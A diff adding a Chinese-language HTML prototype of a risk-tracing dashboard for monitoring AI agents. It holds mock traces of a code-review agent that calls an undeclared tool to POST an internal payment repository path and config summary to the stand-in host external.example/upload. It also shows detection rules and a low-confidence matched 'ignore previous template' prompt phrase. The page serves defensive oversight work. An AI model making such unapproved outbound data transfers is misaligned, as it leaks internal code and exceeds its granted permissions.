@@ -1,0 +1,565 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <title>风险溯源工作台</title>
+  <link rel="stylesheet" href="../../css/style.css">
+  <style>
+    .trace-search { align-items: flex-start; }
+    .trace-search .form-select, .trace-search .form-control { min-width: 150px; }
+    .trace-search .trace-query { min-width: 260px; }
+    .trace-search .advanced-filters { display: none; width: 100%; flex-wrap: wrap; gap: 12px; padding-top: 4px; }
+    .trace-search.expanded .advanced-filters { display: flex; }
+    .filter-toggle { min-width: 96px; }
+    .investigation-layout { display: grid; grid-template-columns: 340px 440px minmax(0, 1fr); gap: 16px; align-items: start; }
+    .trace-list-panel, .script-panel, .evidence-panel { background: #fff; border: 1px solid #EBEEF5; border-radius: 4px; min-width: 0; }
+    .panel-head { padding: 14px 16px; border-bottom: 1px solid #EBEEF5; font-weight: 600; display: flex; justify-content: space-between; align-items: center; }
+    .panel-body { padding: 16px; min-width: 0; }
+    .trace-list { display: grid; gap: 10px; }
+    .trace-card { border: 1px solid #EBEEF5; border-radius: 4px; padding: 10px; margin-bottom: 10px; cursor: pointer; }
+    .trace-list .trace-card { margin-bottom: 0; }
+    .trace-card.active { border-color: #409EFF; background: #F5FAFF; }
+    .trace-card-title { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 6px; }
+    .trace-meta { color: #909399; font-size: 12px; line-height: 1.7; }
+    .script-flow { display: grid; gap: 12px; }
+    .script-step { display: grid; grid-template-columns: 86px 1fr; gap: 12px; border: 1px solid #EBEEF5; border-radius: 4px; padding: 12px; background: #fff; cursor: pointer; }
+    .script-step.active { border-color: #409EFF; box-shadow: 0 0 0 2px rgba(64,158,255,.08); }
+    .script-step.risk { border-color: #F56C6C; background: #FFF7F7; }
+    .step-stage { font-weight: 600; color: #606266; }
+    .step-title { font-weight: 600; margin-bottom: 4px; }
+    .step-detail { color: #606266; font-size: 13px; line-height: 1.7; }
+    .mono { font-family: Consolas, "Courier New", monospace; }
+    .evidence-panel { position: relative; }
+    .evidence-summary { display: grid; grid-template-columns: repeat(4, minmax(130px, 1fr)); gap: 10px; margin-bottom: 14px; }
+    .evidence-summary .kv { border: 1px solid #EBEEF5; border-radius: 4px; padding: 10px; display: block; }
+    .evidence-summary .k { color: #909399; margin-bottom: 6px; }
+    .evidence-tabs { display: flex; gap: 8px; border-bottom: 1px solid #EBEEF5; margin-bottom: 12px; }
+    .evidence-tab { padding: 8px 10px; border-radius: 4px 4px 0 0; color: #606266; cursor: pointer; }
+    .evidence-tab.active { color: #409EFF; background: #ECF5FF; font-weight: 600; }
+    .evidence-box { background: #F5F7FA; border: 1px solid #EBEEF5; border-radius: 4px; padding: 12px; font-size: 13px; line-height: 1.8; color: #303133; }
+    .evidence-box-title { font-weight: 600; margin-bottom: 8px; color: #606266; }
+    .evidence-code { min-height: 250px; max-height: 420px; overflow: auto; white-space: pre; font-family: Consolas, "Courier New", monospace; }
+    .evidence-mark { background: #FFF0F0; color: #D93026; padding: 1px 3px; border-radius: 3px; }
+    .kv-list { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 10px; }
+    .kv { display: grid; grid-template-columns: 88px 1fr; gap: 8px; font-size: 13px; }
+    .kv .k { color: #909399; }
+    .action-row { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 12px; }
+    .evidence-actions { position: sticky; bottom: 0; margin: 16px -16px -16px; padding: 12px 16px; background: #fff; border-top: 1px solid #EBEEF5; display: flex; gap: 8px; flex-wrap: wrap; }
+    @media (max-width: 1400px) {
+      .investigation-layout { grid-template-columns: 320px 400px minmax(0, 1fr); }
+      .evidence-summary { grid-template-columns: repeat(2, minmax(130px, 1fr)); }
+    }
+  </style>
+</head>
+<body class="page-content">
+  <div class="sub-page">
+    <div class="page-header">
+      <div>
+        <div class="page-title">风险溯源工作台</div>
+        <div class="page-subtitle">以 trace_id 为默认调查入口，围绕 Span 证据、工具调用和处置状态还原一次智能体运行风险。</div>
+      </div>
+      <div class="action-row">
+        <button class="btn btn-primary" onclick="openModal('createEventModal')">关联风险事件</button>
+        <button class="btn btn-default" onclick="toastSuccess('调查视图已保存')">保存视图</button>
+      </div>
+    </div>
+
+    <div class="search-bar trace-search">
+      <div class="search-item">
+        <span class="form-label">时间范围</span>
+        <select class="form-select" id="traceTimeRange">
+          <option>今日</option>
+          <option>昨日</option>
+          <option selected>近 7 天</option>
+          <option>自定义</option>
+        </select>
+      </div>
+      <div class="search-item">
+        <span class="form-label">接入应用</span>
+        <select class="form-select" id="traceApp">
+          <option value="">全部应用</option>
+          <option selected>研发代码审查助手</option>
+          <option>人事档案助理</option>
+          <option>智能客服 Copilot</option>
+        </select>
+      </div>
+      <div class="search-item">
+        <span class="form-label">风险等级</span>
+        <select class="form-select" id="traceRiskLevel">
+          <option value="">全部</option>
+          <option selected>高风险</option>
+          <option>中风险</option>
+          <option>低风险</option>
+        </select>
+      </div>
+      <div class="search-item">
+        <span class="form-label">Trace ID / Span ID</span>
+        <input class="form-control mono trace-query" id="traceQuery" value="TRC-20260416-018 / sp_04_tool">
+      </div>
+      <div class="search-btns">
+        <button class="btn btn-primary" onclick="searchTrace()">查询</button>
+        <button class="btn btn-default" onclick="resetTraceSearch()">重置</button>
+        <button class="btn btn-default filter-toggle" id="advancedFilterBtn" onclick="toggleAdvancedFilters()">更多筛选</button>
+      </div>
+      <div class="advanced-filters" id="advancedFilters">
+        <div class="search-item">
+          <span class="form-label">风险类型</span>
+          <select class="form-select" id="traceRiskType">
+            <option value="">全部</option>
+            <option selected>工具能力边界越界</option>
+            <option>敏感数据输出</option>
+            <option>提示词风险</option>
+          </select>
+        </div>
+        <div class="search-item">
+          <span class="form-label">事件状态</span>
+          <select class="form-select" id="traceEventStatus">
+            <option value="">全部</option>
+            <option>待确认</option>
+            <option>已确认</option>
+            <option selected>处理中</option>
+            <option>待关闭</option>
+            <option>误报</option>
+          </select>
+        </div>
+        <div class="search-item">
+          <span class="form-label">Agent / 节点</span>
+          <input class="form-control" id="traceAgent" placeholder="agent_name / node_name" value="代码审查工作流">
+        </div>
+        <div class="search-item">
+          <span class="form-label">工具 / MCP</span>
+          <input class="form-control" id="traceTool" placeholder="tool_name / mcp_server" value="external_http_post">
+        </div>
+      </div>
+    </div>
+
+    <div class="investigation-layout">
+      <div class="trace-list-panel">
+        <div class="panel-head">
+          <span>Trace 调查</span>
+          <button class="btn btn-link" onclick="history.back()">返回列表</button>
+        </div>
+        <div class="panel-body">
+          <div class="trace-list">
+            <div class="trace-card active" onclick="selectTrace(this,'TRC-20260416-018')">
+              <div class="trace-card-title"><strong class="mono">TRC-20260416-018</strong><span class="tag tag-danger">高</span></div>
+              <div class="trace-meta">研发代码审查助手 | 7 个 Span<br>工具外联数据流需确认 | 10:25:33</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="script-panel">
+        <div class="panel-head">
+          <span>风险链路：<span class="mono" id="traceIdTitle">TRC-20260416-018</span></span>
+          <span class="tag tag-danger">已生成风险事件 EVT-2026-00018</span>
+        </div>
+        <div class="panel-body">
+          <div class="script-flow">
+            <div class="script-step" onclick="selectSpan(this,'sp_01_input')">
+              <div class="step-stage">意图输入</div>
+              <div><div class="step-title">用户提交代码审查任务</div><div class="step-detail">Span: <span class="mono">sp_01_input</span> | source_field: prompt.input<br>任务目标：检查合并请求中的配置文件和网络调用。</div></div>
+            </div>
+            <div class="script-step" onclick="selectSpan(this,'sp_02_retriever')">
+              <div class="step-stage">上下文检索</div>
+              <div><div class="step-title">读取企业代码规范知识库</div><div class="step-detail">Span: <span class="mono">sp_02_retriever</span> | resource: kb_secure_coding<br>未发现敏感字段外流。</div></div>
+            </div>
+            <div class="script-step" onclick="selectSpan(this,'sp_03_llm')">
+              <div class="step-stage">模型推理</div>
+              <div><div class="step-title">生成审查步骤和工具调用计划</div><div class="step-detail">Span: <span class="mono">sp_03_llm</span> | detector: intent-boundary-v2<br>模型计划包含外部 URL 请求，超出当前应用声明边界。</div></div>
+            </div>
+            <div class="script-step risk active" onclick="selectSpan(this,'sp_04_tool')">
+              <div class="step-stage">工具调用</div>
+              <div><div class="step-title">调用未声明工具 external_http_post</div><div class="step-detail">Span: <span class="mono">sp_04_tool</span> | tool_id: tool_external_http_post<br>命中规则：未声明工具调用 + 外联数据流确认。已生成证据片段。</div></div>
+            </div>
+            <div class="script-step risk" onclick="selectSpan(this,'sp_05_output')">
+              <div class="step-stage">响应输出</div>
+              <div><div class="step-title">输出包含内部仓库路径和摘要</div><div class="step-detail">Span: <span class="mono">sp_05_output</span> | source_field: llm.response<br>已脱敏展示，原文保留在对象存储，需授权查看。</div></div>
+            </div>
+            <div class="script-step" onclick="selectSpan(this,'sp_06_action')">
+              <div class="step-stage">处置状态</div>
+              <div><div class="step-title">Tool 范围限制已建议，等待人工确认</div><div class="step-detail">建议范围：Tool / external_http_post；TTL：1 小时；影响：3 个 Agent。</div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="evidence-panel">
+        <div class="panel-head"><span>证据工作区</span><span class="tag tag-success">当前 Span：<span class="mono" id="selectedSpan">sp_04_tool</span></span></div>
+        <div class="panel-body">
+          <div class="evidence-summary">
+            <div class="kv"><div class="k">事件编号</div><div class="mono" id="evidenceEventId">EVT-2026-00018</div></div>
+            <div class="kv"><div class="k">风险阶段</div><div id="evidenceStage">工具能力边界确认</div></div>
+            <div class="kv"><div class="k">风险等级</div><div><span class="tag tag-danger">高风险</span></div></div>
+            <div class="kv"><div class="k">置信度</div><div id="evidenceConfidence">0.91</div></div>
+            <div class="kv"><div class="k">证据来源</div><div class="mono" id="evidenceSource">tool.input</div></div>
+            <div class="kv"><div class="k">证据位置</div><div class="mono" id="evidenceOffset">offset 63-89</div></div>
+            <div class="kv"><div class="k">规则版本</div><div class="mono" id="evidenceRule">tool-boundary-v1.8.2</div></div>
+            <div class="kv"><div class="k">脱敏状态</div><div><span class="tag tag-success">已脱敏</span></div></div>
+          </div>
+
+          <div class="evidence-tabs">
+            <div class="evidence-tab active" onclick="switchEvidenceTab(this,'summary')">证据摘要</div>
+            <div class="evidence-tab" onclick="switchEvidenceTab(this,'json')">格式化 JSON</div>
+            <div class="evidence-tab" onclick="switchEvidenceTab(this,'raw')">Raw 授权</div>
+            <div class="evidence-tab" onclick="switchEvidenceTab(this,'rule')">规则解释</div>
+          </div>
+          <div class="alert-box alert-warning"><span class="alert-icon">!</span><span id="evidenceFinding">检测到未声明工具发起外联数据流，Tool Input 中包含内部仓库路径片段，当前应用未声明外部 HTTP POST 能力。</span></div>
+          <div class="kv-list" id="evidenceMetaList" style="margin:12px 0;">
+            <div class="kv"><div class="k">分析主体</div><div id="evidenceSubject">Workflow Node / ReviewChain.invoke</div></div>
+            <div class="kv"><div class="k">关联资源</div><div id="evidenceResource">external.example/upload</div></div>
+            <div class="kv"><div class="k">Trace ID</div><div class="mono" id="evidenceTraceId">TRC-20260416-018</div></div>
+            <div class="kv"><div class="k">Raw 引用</div><div class="mono" id="evidenceRawRef">minio://agentsec/raw/2026/04/16/sp_04_tool.json</div></div>
+          </div>
+          <div class="evidence-box">
+            <div class="evidence-box-title" id="evidenceBoxTitle">当前证据片段</div>
+            <pre class="evidence-code" id="evidenceCode">{
+  "span_id": "sp_04_tool",
+  "source_field": "tool.input",
+  "tool_name": "external_http_post",
+  "input": {
+    "url": "https://external.example/upload",
+    "payload": {
+      "repo_path": "internal/payment",
+      "reason": "code review context",
+      "diff_summary": "contains payment callback config"
+    }
+  },
+  "risk": {
+    "type": "工具能力边界越界",
+    "rule": "tool-boundary-v1.8.2",
+    "confidence": 0.91
+  }
+}</pre>
+          </div>
+          <div class="evidence-actions">
+            <button class="btn btn-primary" onclick="toastSuccess('事件已确认，状态变更为处理中')">确认风险</button>
+            <button class="btn btn-warning" onclick="openModal('actionModal')">建议处置</button>
+            <button class="btn btn-default" onclick="toastSuccess('已标记为误报样本')">标记误报</button>
+            <button class="btn btn-default" onclick="openModal('createEventModal')">关联事件</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="actionModal">
+    <div class="modal-box modal-md">
+      <div class="modal-header"><div class="modal-title">处置建议确认</div><div class="modal-close" onclick="closeModal('actionModal')">×</div></div>
+      <div class="modal-body">
+        <div class="alert-box alert-warning"><span class="alert-icon">!</span><span>建议先按 Tool 范围限制，避免直接影响整个应用。</span></div>
+        <div class="form-row"><div class="form-label">处置范围</div><div class="form-field"><select class="form-select"><option>Tool: external_http_post</option><option>Agent: 研发代码审查助手</option><option>Session: 当前 Trace 关联 Session</option></select></div></div>
+        <div class="form-row"><div class="form-label">TTL</div><div class="form-field"><select class="form-select"><option>1 小时</option><option>6 小时</option><option>24 小时</option></select></div></div>
+        <div class="form-row"><div class="form-label">审批备注</div><div class="form-field"><textarea class="form-textarea" placeholder="说明处置依据和影响范围"></textarea></div></div>
+      </div>
+      <div class="modal-footer"><button class="btn btn-default" onclick="closeModal('actionModal')">取消</button><button class="btn btn-warning" onclick="closeModal('actionModal');toastSuccess('处置动作已下发并记录审计')">确认下发</button></div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="createEventModal">
+    <div class="modal-box modal-md">
+      <div class="modal-header"><div class="modal-title">关联风险事件</div><div class="modal-close" onclick="closeModal('createEventModal')">×</div></div>
+      <div class="modal-body">
+        <div class="form-row"><div class="form-label">Trace ID</div><div class="form-field"><input class="form-control mono" id="eventTraceId" value="TRC-20260416-018" readonly></div></div>
+        <div class="form-row"><div class="form-label">证据 Span</div><div class="form-field"><input class="form-control mono" id="eventSpanId" value="sp_04_tool" readonly></div></div>
+        <div class="form-row"><div class="form-label">事件类型</div><div class="form-field"><select class="form-select"><option>工具能力边界越界</option><option>敏感数据输出</option><option>意图偏移</option></select></div></div>
+      </div>
+      <div class="modal-footer"><button class="btn btn-default" onclick="closeModal('createEventModal')">取消</button><button class="btn btn-primary" onclick="closeModal('createEventModal');toastSuccess('已关联风险事件')">确认</button></div>
+    </div>
+  </div>
+
+  <script src="../../js/common.js"></script>
+  <script>
+    var activeEvidenceTab = 'summary';
+    var currentEvidenceSpan = 'sp_04_tool';
+    var currentTraceId = 'TRC-20260416-018';
+
+    function setShellBreadcrumb(items) {
+      try {
+        if (typeof updateBreadcrumb === 'function') {
+          updateBreadcrumb(items);
+        }
+      } catch (e) {}
+    }
+
+    var evidenceProfiles = {
+      sp_01_input: {
+        eventId: '-',
+        traceId: 'TRC-20260416-018',
+        stage: '意图输入',
+        confidence: '-',
+        source: 'prompt.input',
+        offset: '-',
+        rule: '未命中',
+        subject: 'User Request',
+        resource: 'merge_request',
+        rawRef: 'minio://agentsec/raw/2026/04/16/sp_01_input.json',
+        finding: '用户提交代码审查任务，当前 Span 未命中风险规则，仅作为上下文证据展示。',
+        raw: 'USER PROMPT\n请检查合并请求中的配置文件和网络调用，重点关注支付回调相关变更。',
+        ruleText: '当前 Span 未命中风险规则。作为上游上下文，用于辅助判断后续工具调用是否超出授权边界。',
+        code: '{\n  "span_id": "sp_01_input",\n  "source_field": "prompt.input",\n  "risk_flag": false,\n  "summary": "用户提交代码审查任务"\n}'
+      },
+      sp_02_retriever: {
+        eventId: '-',
+        traceId: 'TRC-20260416-018',
+        stage: '上下文检索',
+        confidence: '-',
+        source: 'retriever.output',
+        offset: '-',
+        rule: '未命中',
+        subject: 'Retriever / SecureCodingKB',
+        resource: 'kb_secure_coding',
+        rawRef: 'minio://agentsec/raw/2026/04/16/sp_02_retriever.json',
+        finding: '检索企业代码规范知识库，未发现敏感字段外流。该 Span 用于解释模型后续计划来源。',
+        raw: 'RETRIEVER OUTPUT\n返回安全编码规范：外联请求需要声明工具能力，并记录目标域名、数据范围和审批依据。',
+        ruleText: '当前 Span 未命中风险规则。该证据说明后续外联调用已有规范约束背景。',
+        code: '{\n  "span_id": "sp_02_retriever",\n  "source_field": "retriever.output",\n  "resource_id": "kb_secure_coding",\n  "risk_flag": false\n}'
+      },
+      sp_04_tool: {
+        eventId: 'EVT-2026-A018',
+        traceId: 'TRC-20260416-018',
+        stage: '工具能力边界确认',
+        confidence: '0.91',
+        source: 'tool.input',
+        offset: 'offset 63-89',
+        rule: 'tool-boundary-v1.8.2',
+        subject: 'Workflow Node / ReviewChain.invoke',
+        resource: 'external.example/upload',
+        rawRef: 'minio://agentsec/raw/2026/04/16/sp_04_tool.json',
+        finding: '检测到未声明工具发起外联数据流，Tool Input 中包含内部仓库路径片段，当前应用未声明外部 HTTP POST 能力。',
+        raw: 'POST /upload HTTP/1.1\nHost: external.example\nContent-Type: application/json\n\n{"repo_path":"internal/payment","reason":"code review context","diff_summary":"contains payment callback config"}',
+        ruleText: '规则 tool-boundary-v1.8.2：当应用未声明外部 HTTP POST 能力，但 Span 中出现 external_http_post 工具调用，且 Tool Input 携带内部资源路径、文件摘要或业务上下文字段时，判定为工具能力边界越界。建议先按 Tool 范围限制，并由负责人确认是否补充工具声明。',
+        code: '{\n  "span_id": "sp_04_tool",\n  "source_field": "tool.input",\n  "tool_name": "external_http_post",\n  "input": {\n    "url": "https://external.example/upload",\n    "payload": {\n      "repo_path": "internal/payment",\n      "reason": "code review context",\n      "diff_summary": "contains payment callback config"\n    }\n  },\n  "risk": {\n    "type": "工具能力边界越界",\n    "rule": "tool-boundary-v1.8.2",\n    "confidence": 0.91\n  }\n}'
+      },
+      sp_05_output: {
+        eventId: 'EVT-2026-A018',
+        traceId: 'TRC-20260416-018',
+        stage: '敏感输出复核',
+        confidence: '0.84',
+        source: 'llm.response',
+        offset: 'offset 118-146',
+        rule: 'response-sensitive-v2.4.0',
+        subject: 'Workflow Node / ReviewChain.invoke',
+        resource: 'internal/payment repository',
+        rawRef: 'minio://agentsec/raw/2026/04/16/sp_05_output.json',
+        finding: '响应输出中包含内部仓库路径和配置摘要，已脱敏展示，原文需要授权后查看。',
+        raw: 'LLM RESPONSE\n审查发现 [REPO_PATH] 中 callback 配置存在外联路径，建议检查支付回调域名和鉴权参数。原文已按敏感字段策略脱敏。',
+        ruleText: '规则 response-sensitive-v2.4.0：当模型响应中包含内部仓库路径、配置摘要、身份字段或业务敏感对象，且输出对象为普通会话响应时，判定为敏感输出复核。P0 原型默认展示脱敏片段，Raw 内容仅保留引用。',
+        code: '{\n  "span_id": "sp_05_output",\n  "source_field": "llm.response",\n  "output_excerpt": "审查发现 [REPO_PATH] 中 callback 配置存在外联路径...",\n  "redaction_state": "redacted",\n  "risk": {\n    "type": "敏感数据输出",\n    "rule": "response-sensitive-v2.4.0",\n    "confidence": 0.84\n  }\n}'
+      },
+      sp_06_action: {
+        eventId: 'EVT-2026-A018',
+        traceId: 'TRC-20260416-018',
+        stage: '处置状态',
+        confidence: '-',
+        source: 'action.status',
+        offset: '-',
+        rule: 'action-suggestion-v1',
+        subject: 'Event Action / restrict_tool',
+        resource: 'external_http_post',
+        rawRef: 'minio://agentsec/raw/2026/04/16/sp_06_action.json',
+        finding: '系统已生成工具级限制建议，等待负责人确认影响范围、TTL 和审批编号。',
+        raw: 'ACTION SUGGESTION\nscope=Tool external_http_post\nttl=6h\napproval_required=true\nrollback_supported=true',
+        ruleText: '处置建议规则：当工具能力边界越界且目标为外联工具时，优先建议 Tool 范围限制，避免直接影响整个应用。',
+        code: '{\n  "span_id": "sp_06_action",\n  "source_field": "action.status",\n  "suggested_action": "restrict_tool",\n  "target_id": "tool_external_http_post",\n  "ttl": "6h",\n  "approval_required": true\n}'
+      },
+      sp_03_llm: {
+        eventId: 'EVT-2026-A018',
+        traceId: 'TRC-20260416-018',
+        stage: '意图边界复核',
+        confidence: '0.78',
+        source: 'llm.plan',
+        offset: 'offset 42-71',
+        rule: 'intent-boundary-v2',
+        subject: 'Workflow Node / ReviewChain.invoke',
+        resource: 'external_http_post',
+        rawRef: 'minio://agentsec/raw/2026/04/16/sp_03_llm.json',
+        finding: '模型调用计划包含外部 HTTP 请求步骤，超出当前应用声明的工具能力边界。',
+        raw: 'MODEL PLAN\n1. read repository diff\n2. compare secure coding rules\n3. call external_http_post for supplementary validation\n4. summarize risk',
+        ruleText: '规则 intent-boundary-v2：当模型生成的工具调用计划包含未声明能力，且计划目标与当前应用授权边界不一致时，进入意图边界复核。此类风险建议优先确认工具声明和节点权限。',
+        code: '{\n  "span_id": "sp_03_llm",\n  "source_field": "llm.plan",\n  "planned_tools": ["repo_reader", "external_http_post"],\n  "risk": {\n    "type": "意图偏移",\n    "rule": "intent-boundary-v2",\n    "confidence": 0.78\n  }\n}'
+      },
+      sp_06_output: {
+        eventId: 'EVT-2026-A012',
+        traceId: 'TRC-20260416-012',
+        stage: '敏感输出复核',
+        confidence: '0.84',
+        source: 'llm.response',
+        offset: 'offset 118-146',
+        rule: 'response-sensitive-v2.4.0',
+        subject: 'ProfileReader.answer',
+        resource: 'employee_profile',
+        rawRef: 'minio://agentsec/raw/2026/04/16/sp_06_output.json',
+        finding: '响应输出中包含员工手机号片段，已脱敏展示，原文需要授权后查看。',
+        raw: 'LLM RESPONSE\n员工联系方式：[PHONE_MASKED]，部门：运营中心。原文已脱敏，需授权查看。',
+        ruleText: '规则 response-sensitive-v2.4.0：当模型响应包含手机号、证件号、员工档案字段等敏感信息时，生成敏感输出复核事件。',
+        code: '{\n  "span_id": "sp_06_output",\n  "source_field": "llm.response",\n  "output_excerpt": "员工联系方式：[PHONE_MASKED]",\n  "redaction_state": "redacted",\n  "risk": {\n    "type": "敏感数据输出",\n    "rule": "response-sensitive-v2.4.0",\n    "confidence": 0.84\n  }\n}'
+      },
+      sp_02_llm: {
+        eventId: 'EVT-2026-A009',
+        traceId: 'TRC-20260416-009',
+        stage: 'Prompt 复核',
+        confidence: '0.43',
+        source: 'prompt.input',
+        offset: 'offset 24-40',
+        rule: 'prompt-risk-low-confidence-v1.1',
+        subject: 'ReplyPlanner',
+        resource: 'customer_ticket',
+        rawRef: 'minio://agentsec/raw/2026/04/16/sp_02_llm.json',
+        finding: '命中低置信度提示词规则，人工复核后标记为误报样本。',
+        raw: 'USER PROMPT\n请忽略之前回复模板，用更简洁的方式告诉客户工单进度。',
+        ruleText: '规则 prompt-risk-low-confidence-v1.1：疑似覆盖原指令的表达需要结合上下文复核，低置信度命中不应直接触发限制动作。',
+        code: '{\n  "span_id": "sp_02_llm",\n  "source_field": "prompt.input",\n  "matched_phrase": "忽略之前回复模板",\n  "confidence": 0.43,\n  "risk": {\n    "type": "提示词风险",\n    "rule": "prompt-risk-low-confidence-v1.1"\n  }\n}'
+      }
+    };
+
+    document.addEventListener('DOMContentLoaded', function() {
+      setShellBreadcrumb([
+        { label: '安全监控' },
+        { label: '风险溯源工作台' }
+      ]);
+      applyTraceDeepLink();
+    });
+
+    function applyTraceDeepLink() {
+      var params = new URLSearchParams(window.location.search);
+      var traceId = params.get('trace_id');
+      var spanId = params.get('span_id');
+      if (traceId) {
+        currentTraceId = traceId;
+        document.getElementById('traceIdTitle').textContent = traceId;
+        document.getElementById('evidenceTraceId').textContent = traceId;
+        document.getElementById('eventTraceId').value = traceId;
+      }
+      if (spanId) {
+        currentEvidenceSpan = spanId;
+        document.getElementById('selectedSpan').textContent = spanId;
+        document.querySelectorAll('.script-step').forEach(function(item){ item.classList.remove('active'); });
+        updateEvidence(spanId);
+      } else {
+        renderEvidenceTab(evidenceProfiles[currentEvidenceSpan]);
+      }
+    }
+
+    function selectTrace(el, id) {
+      document.querySelectorAll('.trace-card').forEach(function(item){ item.classList.remove('active'); });
+      el.classList.add('active');
+      currentTraceId = id;
+      document.getElementById('traceIdTitle').textContent = id;
+      document.getElementById('traceQuery').value = id;
+      document.getElementById('evidenceTraceId').textContent = id;
+      document.getElementById('eventTraceId').value = id;
+      toastSuccess('已切换到 ' + id);
+    }
+
+    function selectSpan(el, spanId) {
+      document.querySelectorAll('.script-step').forEach(function(item){ item.classList.remove('active'); });
+      el.classList.add('active');
+      document.getElementById('selectedSpan').textContent = spanId;
+      currentEvidenceSpan = spanId;
+      updateEvidence(spanId);
+      toastSuccess('证据工作区已切换到 ' + spanId);
+    }
+
+    function updateEvidence(spanId) {
+      var profile = evidenceProfiles[spanId];
+      if (!profile) {
+        renderEmptyEvidence(spanId);
+        return;
+      }
+      document.getElementById('evidenceEventId').textContent = profile.eventId;
+      document.getElementById('evidenceStage').textContent = profile.stage;
+      document.getElementById('evidenceConfidence').textContent = profile.confidence;
+      document.getElementById('evidenceSource').textContent = profile.source;
+      document.getElementById('evidenceOffset').textContent = profile.offset;
+      document.getElementById('evidenceRule').textContent = profile.rule;
+      document.getElementById('evidenceFinding').textContent = profile.finding;
+      document.getElementById('evidenceSubject').textContent = profile.subject;
+      document.getElementById('evidenceResource').textContent = profile.resource;
+      document.getElementById('evidenceTraceId').textContent = currentTraceId;
+      document.getElementById('evidenceRawRef').textContent = profile.rawRef;
+      document.getElementById('eventTraceId').value = currentTraceId;
+      document.getElementById('eventSpanId').value = spanId;
+      document.getElementById('traceQuery').value = currentTraceId + ' / ' + spanId;
+      renderEvidenceTab(profile);
+    }
+
+    function switchEvidenceTab(el, tab) {
+      document.querySelectorAll('.evidence-tab').forEach(function(item){ item.classList.remove('active'); });
+      el.classList.add('active');
+      activeEvidenceTab = tab;
+      renderEvidenceTab(evidenceProfiles[currentEvidenceSpan]);
+    }
+
+    function renderEvidenceTab(profile) {
+      if (!profile) {
+        renderEmptyEvidence(currentEvidenceSpan);
+        return;
+      }
+      var title = '当前证据片段';
+      var content = profile.code;
+      var metaList = document.getElementById('evidenceMetaList');
+      metaList.style.display = 'grid';
+
+      if (activeEvidenceTab === 'summary') {
+        title = '证据摘要';
+        content = '结论：' + profile.finding + '\n\n证据锚点：' + currentEvidenceSpan + '\n证据来源：' + profile.source + '\n关联资源：' + profile.resource + '\n建议动作：先确认能力边界与业务授权，再决定是否下发临时限制。';
+      } else if (activeEvidenceTab === 'json') {
+        title = '格式化 JSON';
+        content = profile.code;
+      } else if (activeEvidenceTab === 'raw') {
+        title = 'Raw 授权入口';
+        content = 'Raw 原文不在普通调查工作台直接展示。\n\nraw_ref：' + profile.rawRef + '\nmask_status：已脱敏展示\n授权要求：填写访问原因并关联 approval_id，访问记录写入高敏访问审计。\n可用操作：申请查看 Raw、复制 raw_ref、导出脱敏证据摘要。';
+      } else if (activeEvidenceTab === 'rule') {
+        title = '规则解释';
+        content = profile.ruleText;
+        metaList.style.display = 'none';
+      }
+
+      document.getElementById('evidenceBoxTitle').textContent = title;
+      document.getElementById('evidenceCode').textContent = content;
+    }
+
+    function renderEmptyEvidence(spanId) {
+      document.getElementById('evidenceEventId').textContent = '-';
+      document.getElementById('evidenceStage').textContent = '无风险证据';
+      document.getElementById('evidenceConfidence').textContent = '-';
+      document.getElementById('evidenceSource').textContent = '-';
+      document.getElementById('evidenceOffset').textContent = '-';
+      document.getElementById('evidenceRule').textContent = '-';
+      document.getElementById('evidenceFinding').textContent = '当前 Span 暂无独立风险证据。';
+      document.getElementById('evidenceSubject').textContent = '-';
+      document.getElementById('evidenceResource').textContent = '-';
+      document.getElementById('evidenceRawRef').textContent = '-';
+      document.getElementById('eventSpanId').value = spanId;
+      document.getElementById('traceQuery').value = currentTraceId + ' / ' + spanId;
+      document.getElementById('evidenceBoxTitle').textContent = '空态';
+      document.getElementById('evidenceCode').textContent = '当前 Span 未命中风险规则，也未配置 Raw 证据引用。';
+    }
+
+    function toggleAdvancedFilters() {
+      var search = document.querySelector('.trace-search');
+      var btn = document.getElementById('advancedFilterBtn');
+      var expanded = search.classList.toggle('expanded');
+      btn.textContent = expanded ? '收起筛选' : '更多筛选';
+    }
+
+    function searchTrace() {
+      toastSuccess('风险链路已刷新');
+    }
+
+    function resetTraceSearch() {
+      ['traceAgent', 'traceTool', 'traceQuery'].forEach(function(id) {
+        document.getElementById(id).value = '';
+      });
+      ['traceApp', 'traceRiskLevel', 'traceRiskType', 'traceEventStatus'].forEach(function(id) {
+        document.getElementById(id).value = '';
+      });
+      document.getElementById('traceTimeRange').value = '近 7 天';
+      document.querySelector('.trace-search').classList.remove('expanded');
+      document.getElementById('advancedFilterBtn').textContent = '更多筛选';
+      toastSuccess('筛选条件已重置');
+    }
+  </script>
+</body>
+</html>
